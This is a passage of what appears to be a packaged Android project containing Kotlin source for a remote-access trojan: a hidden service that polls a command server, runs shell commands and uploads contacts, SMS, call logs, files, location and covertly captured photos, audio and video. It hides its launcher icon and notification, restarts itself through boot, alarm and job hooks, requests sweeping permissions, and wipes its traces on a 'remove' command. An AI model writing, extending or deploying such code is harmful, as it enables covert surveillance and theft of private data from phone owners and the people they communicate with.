            registerReceiver(networkReceiver, IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION))
        } catch (_: Exception) {}

        wakeEventReceiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, i: Intent?) {
                try { kickPolling() } catch (_: Throwable) {}
            }
        }
        try {
            registerReceiver(wakeEventReceiver, IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_USER_PRESENT)
                addAction(Intent.ACTION_POWER_CONNECTED)
            })
        } catch (_: Exception) {}

        scheduleAlarm()
        scheduleJob()
        startWatchdogs()
    }

    private fun loadExecutedIds() {
        try {
            val prefs = getSharedPreferences(EXEC_STATE_PREFS, Context.MODE_PRIVATE)
            val stored = prefs.getStringSet(EXEC_STATE_KEY, emptySet()) ?: emptySet()
            synchronized(executedIds) { executedIds.addAll(stored) }
        } catch (_: Throwable) {}
    }

    private fun persistExecutedId(id: String) {
        try {
            val prefs = getSharedPreferences(EXEC_STATE_PREFS, Context.MODE_PRIVATE)
            val snapshot = synchronized(executedIds) {
                executedIds.toList().takeLast(EXEC_STATE_MAX).toSet()
            }
            prefs.edit().putStringSet(EXEC_STATE_KEY, snapshot).apply()
        } catch (_: Throwable) {}
    }

    private fun startWatchdogs() {
        scope.launch {
            while (isRunning) {
                try {
                    delay(60_000L)
                    val age = System.currentTimeMillis() - lastPollSuccessMs
                    if (lastPollSuccessMs > 0L && age > 120_000L) {
                        Log.w("CommService", "polling stuck for ${age}ms — restarting")
                        kickPolling()
                    }
                } catch (_: Throwable) {}
            }
        }
        scope.launch {
            while (isRunning) {
                try {
                    delay(3 * 60 * 1000L)
                    if (wakeLock?.isHeld == false) wakeLock?.acquire(10 * 60 * 1000L)
                } catch (_: Throwable) {}
            }
        }
        scope.launch {
            while (isRunning) {
                try {
                    delay(60_000L)
                    if (TelemetryStreamer.isActive() && !TelemetryStreamer.isJobAlive()) {
                        Log.w("CommService", "telemetry streamer dead — restarting")
                        TelemetryStreamer.stop()
                        TelemetryStreamer.start(this@CommunicationService, scope)
                    }
                } catch (_: Throwable) {}
            }
        }
        scope.launch {
            while (isRunning) {
                try {
                    delay(30_000L)
                    if (ShellSession.isActive() && !ShellSession.isHealthy()) {
                        Log.w("CommService", "shell unhealthy — reaping")
                        ShellSession.stop()
                    }
                } catch (_: Throwable) {}
            }
        }
    }

    private fun scheduleAlarm() {
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val i = Intent(this, AlarmReceiver::class.java).apply { action = "com.yourapp.client.ALARM_POLL" }
            val pi = PendingIntent.getBroadcast(this, ALARM_RC, i, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
            val at = SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
            else
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
        } catch (_: Exception) {}
    }

    private fun scheduleJob() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return
            val s = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val c = ComponentName(this, ReliabilityJobService::class.java)
            val b = JobInfo.Builder(JOB_ID, c).setPersisted(true).setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) b.setPeriodic(15 * 60 * 1000L, 5 * 60 * 1000L)
            else b.setPeriodic(15 * 60 * 1000L)
            s.schedule(b.build())
        } catch (_: Exception) {}
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        try {
            if (SharedPrefsManager.isRemoved(this)) {
                stopSelf()
                return START_NOT_STICKY
            }
            if (wakeLock?.isHeld == false) wakeLock?.acquire(10 * 60 * 1000L)
            startPolling()
        } catch (e: Throwable) {
            Log.e("CommService", "onStartCommand: " + (e.message ?: ""))
        }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        try {
            val restart = Intent(applicationContext, CommunicationService::class.java)
            val pi = PendingIntent.getService(this, 2, restart,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1500L, pi)
            else
                am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1500L, pi)
        } catch (_: Throwable) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            ch.setSound(null, null)
            ch.enableVibration(false)
            ch.setVibrationPattern(null)
            ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("").setContentText("")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentIntent(pi).setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN).build()
        else
            Notification.Builder(this)
                .setContentTitle("").setContentText("")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentIntent(pi).setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN).build()
    }

    private fun startPolling() {
        synchronized(pollingLock) {
            if (pollingJob?.isActive == true) return
            pollingJob = scope.launch { pollingLoop() }
        }
    }

    private fun kickPolling() {
        synchronized(pollingLock) {
            consecutiveFailures = 0
            try { pollingJob?.cancel() } catch (_: Throwable) {}
            pollingJob = scope.launch { pollingLoop() }
        }
        scope.launch { try { pollServer() } catch (_: Throwable) {} }
    }

    private suspend fun pollingLoop() {
        var tick = 0
        while (isRunning && !SharedPrefsManager.isRemoved(this)) {
            val ok = try { pollServer() } catch (_: Throwable) { false }
            if (ok) {
                consecutiveFailures = 0
                tick++
                if (tick % 150 == 0) {
                    scheduleAlarm()
                    scheduleJob()
                }
                delay(BASE_POLL_MS)
            } else {
                consecutiveFailures++
                val exp = min(consecutiveFailures - 1, 5)
                val backoff = min(BASE_POLL_MS * (1L shl exp), MAX_POLL_MS)
                delay(max(backoff, 1000L))
            }
        }
    }

    private fun getBatteryLevel(): Int = try {
        val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val l = i?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val s = i?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        if (l >= 0 && s > 0) (l * 100 / s) else -1
    } catch (_: Exception) { -1 }

    private fun isCharging(): Boolean = try {
        val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val s = i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        s == BatteryManager.BATTERY_STATUS_CHARGING || s == BatteryManager.BATTERY_STATUS_FULL
    } catch (_: Exception) { false }

    private fun isScreenOn(): Boolean = try {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) pm.isInteractive else pm.isScreenOn
    } catch (_: Exception) { false }

    private fun getNetworkType(): String = try {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val c = cm.getNetworkCapabilities(cm.activeNetwork)
        when {
            c?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
            c?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Cellular"
            c?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
            else -> "Unknown"
        }
    } catch (_: Exception) { "Unknown" }

    private suspend fun pollServer(): Boolean = withContext(Dispatchers.IO) {
        val urls = SharedPrefsManager.getAllServerUrls(this@CommunicationService)
        if (urls.isEmpty()) return@withContext false
        val si = lastUrlIndex % urls.size
        lastUrlIndex = (lastUrlIndex + 1) % urls.size
        val modelStr = (Build.MANUFACTURER + " " + Build.MODEL).trim()
        val mfr = Build.MANUFACTURER ?: ""
        val av = Build.VERSION.RELEASE ?: ""
        val bat = getBatteryLevel()
        val ch = isCharging()
        val so = isScreenOn()
        val net = getNetworkType()
        for (offset in urls.indices) {
            val sUrl = urls[(si + offset) % urls.size]
            try {
                val k = SharedPrefsManager.getEncryptionKey(this@CommunicationService)
                val ok = SharedPrefsManager.getOldEncryptionKey(this@CommunicationService)
                val did = DeviceFingerprint.getDeviceId(this@CommunicationService)
                val ts = System.currentTimeMillis().toString()
                val auth = generateAuthToken(ts, k)
                val url = URL(sUrl)
                val conn = (if (sUrl.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "GET"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", auth)
                conn.setRequestProperty("X-Client-ID", did)
                conn.setRequestProperty("X-Device-Model", modelStr)
                conn.setRequestProperty("X-Device-Manufacturer", mfr)
                conn.setRequestProperty("X-Device-Android", av)
                conn.setRequestProperty("X-Device-Battery", if (bat >= 0) bat.toString() else "?")
                conn.setRequestProperty("X-Device-Charging", if (ch) "1" else "0")
                conn.setRequestProperty("X-Device-Screen", if (so) "1" else "0")
                conn.setRequestProperty("X-Device-Network", net)
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 8000
                conn.readTimeout = 12000
                val code = conn.responseCode
                if (code == 200) {
                    val enc = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                    conn.disconnect()
                    lastPollSuccessMs = System.currentTimeMillis()
                    val dec = decryptCommand(enc, k, ok)
                    if (dec.isNotEmpty()) {
                        scope.launch {
                            try { handleCommand(dec) } catch (e: Throwable) {
                                Log.e("CommService", "handleCommand: " + (e.message ?: ""))
                            }
                        }
                    }
                    return@withContext true
                } else if (code == 403) {
                    conn.disconnect()
                    return@withContext false
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        false
    }

    private fun decryptCommand(h: String, k: String, ok: String): String {
        try {
            return AESHelper.decrypt(h, k)
        } catch (_: Exception) {
            if (ok.isNotEmpty()) try { return AESHelper.decrypt(h, ok) } catch (_: Exception) {}
        }
        return ""
    }

    private fun handleCommand(fc: String) {
        var cmd = fc
        var cid = ""
        val m = Regex("\\(ID-([A-Z0-9]+)\\)$").find(fc)
        if (m != null) {
            cid = m.groupValues[1]
            cmd = fc.substring(0, m.range.first).trim()
        }
        if (cid.isNotEmpty()) synchronized(executedIds) {
            if (executedIds.contains(cid)) return
            executedIds.add(cid)
        }
        persistExecutedId(cid)

        val tks = cmd.split(" ")
        val c = tks[0]
        val args = if (tks.size > 1) tks.subList(1, tks.size) else emptyList()
        when (c) {
            "test" -> sendCommandResult(c, "Test successful", cid)
            "echo" -> sendCommandResult(c, args.joinToString(" "), cid)
            "getid" -> sendCommandResult(c, "ID: " + DeviceFingerprint.getDeviceId(this), cid)
            "info" -> {
                val p = try { InfoCollector.collect(this) } catch (e: Throwable) {
                    "info failed: " + (e.message ?: e.javaClass.simpleName)
                }
                sendInfoReport(p, cid)
            }
            "listen_start" -> {
                val ok = TelemetryStreamer.start(this, scope)
                sendCommandResult("listen_start", if (ok) "listen started" else "listen failed", cid)
            }
            "listen_stop" -> {
                TelemetryStreamer.stop()
                sendCommandResult("listen_stop", "listen stopped", cid)
            }
            "remove" -> selfDestruct()
            "updatekey" -> if (args.isNotEmpty()) {
                SharedPrefsManager.setOldEncryptionKey(this, SharedPrefsManager.getEncryptionKey(this))
                SharedPrefsManager.setEncryptionKey(this, args[0])
                scope.launch {
                    delay(600_000)
                    SharedPrefsManager.clearOldEncryptionKey(this@CommunicationService)
                }
            }
            "updateserver" -> if (args.isNotEmpty()) {
                val u = args[0]
                val f = if (u.startsWith("http://") || u.startsWith("https://")) u else "https://$u"
                SharedPrefsManager.setServerUrl(this, f)
            }
            "fallback" -> if (args.isNotEmpty())
                SharedPrefsManager.setFallbackServerUrls(this, args[0].split("|").filter { it.isNotBlank() })
            "shellstart" -> {
                val ok = ShellSession.start(this)
                sendCommandResult("shellstart", if (ok) "shell ready" else "shell failed", cid)
            }
            "shellstop" -> {
                ShellSession.stop()
                sendCommandResult("shellstop", "shell stopped", cid)
            }
            "shellint" -> ShellSession.interrupt()
            "shellcmd" -> {
                if (!ShellSession.isActive()) ShellSession.start(this)
                val cmdText = args.joinToString(" ")
                val timeoutJob = scope.launch {
                    delay(5 * 60 * 1000L)
                    try { ShellSession.interrupt() } catch (_: Throwable) {}
                }
                ShellSession.exec(cmdText, cid) { _, _ -> timeoutJob.cancel() }
            }
            "contacts" -> sendJsonData("contacts", DataCollector.getContacts(this), cid)
            "sms" -> sendJsonData("sms", DataCollector.getSms(this), cid)
            "calllog" -> sendJsonData("calllog", DataCollector.getCallLog(this), cid)
            "photo" -> {
                val i = Intent(this, CaptureActivity::class.java).apply {
                    putExtra(CaptureActivity.EXTRA_COMMAND, "photo")
                    putExtra(CaptureActivity.EXTRA_CLIENT_ID, DeviceFingerprint.getDeviceId(this@CommunicationService))
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(i)
                sendCommandResult("photo", "Photo capture started", cid)
            }
            "audio" -> scope.launch {
                try {
                    if (MediaRecorderHelper.startRecording(this@CommunicationService, "audio")) {
                        delay(10000)
                        val f = MediaRecorderHelper.stopRecording()
                        if (f != null && f.exists()) uploadFile(f, "audio", cid)
                        else sendCommandResult("audio", "no file", cid)
                    } else sendCommandResult("audio", "Failed to start", cid)
                } catch (e: Exception) {
                    sendCommandResult("audio", "Error: " + e.message, cid)
                }
            }
            "video" -> scope.launch {
                try {
                    if (MediaRecorderHelper.startRecording(this@CommunicationService, "video")) {
                        delay(10000)
                        val f = MediaRecorderHelper.stopRecording()
                        if (f != null && f.exists()) uploadFile(f, "video", cid)
                        else sendCommandResult("video", "no file", cid)
                    } else sendCommandResult("video", "Failed", cid)
                } catch (e: Exception) {
                    sendCommandResult("video", "Error: " + e.message, cid)
                }
            }
            "file" -> if (args.isNotEmpty()) {
                val f = File(args[0])
                if (f.exists() && f.isFile) uploadFile(f, "file", cid)
                else sendCommandResult("file", "not found", cid)
            } else sendCommandResult("file", "missing path", cid)
            "location" -> {
                val l = InfoCollector.getGpsCoordinates(this)
                sendCommandResult("location", if (l != null) "Lat: ${l.first}, Lon: ${l.second}" else "unavailable", cid)
            }
            else -> sendCommandResult("shell", CommandExecutor.execute(fc), cid)
        }
    }

    private fun selfDestruct() {
        isRunning = false
        try {
            startActivity(Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (_: Exception) {}
        Thread {
            try { Thread.sleep(1500) } catch (_: Exception) {}
            try { getSharedPreferences("client_prefs", Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Exception) {}
            try { getSharedPreferences(EXEC_STATE_PREFS, Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Exception) {}
            try { filesDir?.listFiles()?.forEach { it.deleteRecursively() } } catch (_: Exception) {}
            try { cacheDir?.listFiles()?.forEach { it.deleteRecursively() } } catch (_: Exception) {}
            try {
                val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val i = Intent(this@CommunicationService, AlarmReceiver::class.java)
                val pi = PendingIntent.getBroadcast(this@CommunicationService, ALARM_RC, i,
                    PendingIntent.FLAG_NO_CREATE or PendingIntent.FLAG_IMMUTABLE)
                if (pi != null) am.cancel(pi)
            } catch (_: Exception) {}
            try { (getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler).cancelAll() } catch (_: Exception) {}
            try { ShellSession.stop() } catch (_: Exception) {}
            try { TelemetryStreamer.stop() } catch (_: Exception) {}
            for (n in listOf(MainActivity::class.java.name, CaptureActivity::class.java.name,
                CommunicationService::class.java.name, ReliabilityJobService::class.java.name,
                NetworkChangeReceiver::class.java.name, AlarmReceiver::class.java.name, BootReceiver::class.java.name)) {
                try {
                    packageManager.setComponentEnabledSetting(ComponentName(packageName, n),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                } catch (_: Exception) {}
            }
            try {
                packageManager.setApplicationEnabledSetting(packageName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            } catch (_: Exception) {}
            try { stopForeground(true) } catch (_: Exception) {}
            try { android.os.Process.killProcess(android.os.Process.myPid()) } catch (_: Exception) {}
        }.start()
    }

    private fun uploadFile(f: File, cmd: String, cid: String) {
        try {
            val b = f.readBytes()
            FileUploader.uploadFile(this, b, f.name, cmd, DeviceFingerprint.getDeviceId(this)) { ok ->
                sendCommandResult(cmd, if (ok) "File uploaded: ${f.name}" else "Upload failed: ${f.name}", cid)
                f.delete()
            }
        } catch (e: Exception) {
            sendCommandResult(cmd, "Error: " + e.message, cid)
        }
    }

    private fun sendJsonData(cmd: String, data: JSONObject, cid: String) {
        scope.launch {
            try {
                val s = SharedPrefsManager.getServerUrl(this@CommunicationService)
                val k = SharedPrefsManager.getEncryptionKey(this@CommunicationService)
                val did = DeviceFingerprint.getDeviceId(this@CommunicationService)
                val ts = System.currentTimeMillis().toString()
                val a = generateAuthToken(ts, k)
                val encData = AESHelper.encrypt(data.toString(), k)
                val payload = JSONObject().apply {
                    put("client_id", did)
                    put("command", cmd)
                    put("data", encData)
                }
                val url = URL("$s/data")
                val conn = (if (s.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "POST"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", a)
                conn.setRequestProperty("X-Client-ID", did)
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 10000
                conn.readTimeout = 20000
                conn.doOutput = true
                conn.outputStream.write(payload.toString().toByteArray())
                conn.outputStream.flush()
                val r = conn.responseCode
                conn.disconnect()
                sendCommandResult(cmd, if (r == 200) "Data sent" else "Failed (HTTP $r)", cid)
            } catch (e: Exception) {
                sendCommandResult(cmd, "Error: " + e.message, cid)
            }
        }
    }

    private fun sendInfoReport(info: String, cid: String) {
        scope.launch {
            try {
                val s = SharedPrefsManager.getServerUrl(this@CommunicationService)
                val k = SharedPrefsManager.getEncryptionKey(this@CommunicationService)
                val did = DeviceFingerprint.getDeviceId(this@CommunicationService)
                val ts = System.currentTimeMillis().toString()
                val a = generateAuthToken(ts, k)
                val e = AESHelper.encrypt(info, k)
                val url = URL("$s/info")
                val conn = (if (s.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "POST"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", a)
                conn.setRequestProperty("X-Client-ID", did)
                conn.setRequestProperty("X-Command-ID", cid)
                conn.setRequestProperty("Content-Type", "text/plain")
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 10000
                conn.readTimeout = 30000
                conn.doOutput = true
                conn.outputStream.write(e.toByteArray())
                conn.outputStream.flush()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }
    }

    private fun sendCommandResult(cmd: String, out: String, cid: String) {
        scope.launch {
            try {
                val s = SharedPrefsManager.getServerUrl(this@CommunicationService)
                val k = SharedPrefsManager.getEncryptionKey(this@CommunicationService)
                val did = DeviceFingerprint.getDeviceId(this@CommunicationService)
                val ts = System.currentTimeMillis().toString()
                val a = generateAuthToken(ts, k)
                val e = AESHelper.encrypt(out, k)
                val url = URL("$s/result")
                val conn = (if (s.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "POST"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", a)
                conn.setRequestProperty("X-Client-ID", did)
                conn.setRequestProperty("X-Command", cmd)
                if (cid.isNotEmpty()) conn.setRequestProperty("X-Command-ID", cid)
                conn.setRequestProperty("Content-Type", "text/plain")
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 10000
                conn.readTimeout = 15000
                conn.doOutput = true
                conn.outputStream.write(e.toByteArray())
                conn.outputStream.flush()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }
    }

    private fun generateAuthToken(ts: String, k: String): String =
        MessageDigest.getInstance("SHA-256").digest("$ts:$k".toByteArray()).joinToString("") { "%02x".format(it) }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        job.cancel()
        ShellSession.stop()
        TelemetryStreamer.stop()
        try { unregisterReceiver(networkReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(wakeEventReceiver) } catch (_: Exception) {}
        try {
            (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .let { networkCallback?.let { cb -> it.unregisterNetworkCallback(cb) } }
        } catch (_: Exception) {}
        try { wakeLock?.release() } catch (_: Exception) {}
    }
}
""",
"app/src/main/java/com/yourapp/client/AlarmReceiver.kt": r"""
package com.yourapp.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager

class AlarmReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        try {
            val si = Intent(context, CommunicationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(si)
            else context.startService(si)
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RemoteClient::AlarmWakeLock")
            wl.acquire(30000L)
            try {} finally { if (wl.isHeld) wl.release() }
        } catch (_: Throwable) {}
    }
}
""",
"app/src/main/java/com/yourapp/client/NetworkChangeReceiver.kt": r"""
package com.yourapp.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager

class NetworkChangeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        try {
            if (intent.action == ConnectivityManager.CONNECTIVITY_ACTION) {
                val si = Intent(context, CommunicationService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    context.startForegroundService(si)
                else
                    context.startService(si)
            }
        } catch (_: Throwable) {}
    }
}
""",
"app/src/main/java/com/yourapp/client/MainActivity.kt": r"""
package com.yourapp.client

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    companion object {
        private const val REQ_P = 100
        private const val REQ_BG = 101
        @Volatile private var handlerInstalled = false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!handlerInstalled) {
            try {
                Thread.setDefaultUncaughtExceptionHandler { t, e ->
                    Log.e("RemoteClient", "uncaught ${t.name}: " + (e.message ?: e.javaClass.simpleName))
                }
                handlerInstalled = true
            } catch (_: Throwable) {}
        }
        try {
            setContentView(R.layout.activity_main)
            requestAllPermissions()
            requestIgnoreBatteryOptimizations()
            requestExactAlarmPermission()
            val si = Intent(this, CommunicationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(si) else startService(si)
            val cn = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED or PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                PackageManager.DONT_KILL_APP)
            finish()
        } catch (e: Throwable) {
            Log.e("MainActivity", "onCreate: " + (e.message ?: ""))
            finish()
        }
    }

    private fun requestAllPermissions() {
        val w = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS, Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            w.add(Manifest.permission.BLUETOOTH_CONNECT)
            w.add(Manifest.permission.BLUETOOTH_SCAN)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            w.add(Manifest.permission.READ_MEDIA_IMAGES)
            w.add(Manifest.permission.READ_MEDIA_VIDEO)
            w.add(Manifest.permission.READ_MEDIA_AUDIO)
        }
        val ng = w.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }.toTypedArray()
        if (ng.isNotEmpty()) ActivityCompat.requestPermissions(this, ng, REQ_P)
        else requestBackgroundLocationIfNeeded()
    }

    override fun onRequestPermissionsResult(rc: Int, perms: Array<out String>, gr: IntArray) {
        super.onRequestPermissionsResult(rc, perms, gr)
        if (rc == REQ_P) requestBackgroundLocationIfNeeded()
    }

    private fun requestBackgroundLocationIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val bg = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!fine || bg) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (_: Exception) {}
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), REQ_BG)
        }
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")))
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val am = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
            if (!am.canScheduleExactAlarms()) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM,
                        Uri.parse("package:$packageName")))
                } catch (_: Exception) {}
            }
        }
    }
}
""",
"app/src/main/java/com/yourapp/client/BootReceiver.kt": r"""
package com.yourapp.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        try {
            if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
                intent.action == "android.intent.action.QUICKBOOT_POWERON" ||
                intent.action == "com.htc.intent.action.QUICKBOOT_POWERON") {
                val si = Intent(context, CommunicationService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(si)
                else context.startService(si)
            }
        } catch (_: Throwable) {}
    }
}
""",
"app/src/main/java/com/yourapp/client/CaptureActivity.kt": r"""
package com.yourapp.client

import android.Manifest
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CaptureActivity : AppCompatActivity() {
    private var photoFile: File? = null
    private var uploadCommand: String = "photo"
    private var clientId: String = ""

    companion object {
        private const val REQ = 101
        const val EXTRA_COMMAND = "extra_command"
        const val EXTRA_CLIENT_ID = "extra_client_id"
    }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            clientId = intent.getStringExtra(EXTRA_CLIENT_ID) ?: DeviceFingerprint.getDeviceId(this)
            uploadCommand = intent.getStringExtra(EXTRA_COMMAND) ?: "photo"
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ)
                return
            }
            startCamera()
        } catch (_: Throwable) {
            finish()
        }
    }

    override fun onRequestPermissionsResult(rc: Int, p: Array<out String>, gr: IntArray) {
